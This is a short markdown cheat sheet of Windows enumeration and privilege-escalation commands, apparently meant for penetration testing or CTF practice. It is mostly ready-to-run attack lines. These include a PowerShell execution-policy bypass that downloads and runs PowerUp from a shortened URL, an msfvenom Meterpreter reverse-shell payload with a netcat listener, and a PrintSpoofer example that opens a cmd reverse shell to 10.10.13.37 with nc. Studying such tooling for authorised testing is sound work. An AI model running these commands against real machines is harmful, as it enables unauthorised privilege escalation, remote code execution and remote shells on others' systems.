## Windows Enumeration, Exploits & Utils.

#### Below is a collection of tools to enumerate a Windows Machine, upload/download files in PowerShell, and then some common exploits to escalate privileges.

---

**enum4linux**

- `enum4linux [OPTIONS] IP_ADDRESS`

**PowerUp.ps1**

- `PS C:\> Import-Module PowerUp.ps1`
- `PS C:\> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt`

**Run PowerUp.ps1 remotely**

- `C:\> powershell -nop -exec bypass -c “IEX (New-Object Net WebClient).DownloadString(‘http://bit.ly/1mK64oH’);`
- `Invoke-AllChecks | Out-File -Encoding ASCII checks.txt”`

**Privesc**

- https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
- https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

**Exploits to check for.**

- Unquoted path to service
- Replaceable EXE files
- Restart service `sc stop SERVICE`/`sc start SERVICE`

**Reverse Meterpreter Shell**

- Client: - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=HOST LPORT=PORT -f exe -o Exploit.exe`
- Attacker: `nc -lnvp PORT`

**Download file to PowerShell**

- `Invoke-WebRequest [-UseBasicParsing] -Uri <source> -OutFile <destination>`

**Copy File**

- `Copy-Item 'SOURCE_FILE' -Destination 'DESTINATION_FOLDER'`

**List all services**

- `Get-Service` - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.2

**winPEAS.exe**

- Download here: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- Usage: `winpeas.exe > output.txt`
- Read output: `Get-Content output.txt`

**SeImpersonatePrivilege Exploit**

- `whoami /priv`
- check for `SeImpersonatePrivilege`
- download https://github.com/itm4n/PrintSpoofer
- eg1: `PrintSpoofer.exe -i -c cmd`
- eg2 (non-interactive): `PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"`
